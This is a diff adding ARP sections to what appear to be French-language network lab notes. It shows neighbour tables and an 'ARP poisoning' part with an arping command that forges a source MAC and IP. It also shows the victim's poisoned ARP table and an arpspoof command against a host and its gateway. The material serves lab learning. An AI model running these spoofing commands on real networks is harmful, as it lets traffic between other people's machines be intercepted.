@@ -88,4 +88,32 @@ LPORT       : 20005
 RHOST:PORT  : 127.0.0.1:20006
 MTU         : 1500
 
+## ARP
+
+ip n s
+10.2.1.10 dev enp0s3 lladdr 00:50:79:66:68:00 STALE 
+192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 DELAY 
+10.2.1.254 dev enp0s3 lladdr 08:00:27:0e:57:53 STALE 
+
+- Table arp Node1
+
+PC1> show arp       
+
+08:00:27:8e:36:0f  10.2.1.253 expires in 117 seconds 
+
+## ARP poisoning
+
+### Commande attaquant avec arping
+
+sudo arping -i gns0 -S 10.2.1.28 -s 00:00:00:00:00:01 10.2.1.100 
+
+- Table arp node1
+
+PC1> arp
+
+00:00:00:00:00:01  10.2.1.28 expires in 114 seconds 
+
+### Arpspoof
+
+sudo arpspoof -i eth0 -t 10.2.1.100 -r 10.2.1.254
 
